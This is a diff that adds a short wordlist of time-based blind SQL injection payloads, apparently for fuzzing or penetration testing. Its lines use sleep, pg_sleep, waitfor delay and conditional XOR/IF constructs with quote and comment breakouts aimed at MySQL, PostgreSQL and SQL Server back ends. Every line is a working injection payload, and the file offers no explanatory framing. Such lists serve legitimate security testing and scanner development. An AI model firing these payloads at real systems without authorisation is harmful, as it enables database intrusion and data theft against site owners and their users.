@@ -1,0 +1,18 @@
+sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+XOR(if(now()=sysdate(),sleep(5),0))XOR
+1'-IF(1=1,SLEEP(5),0)
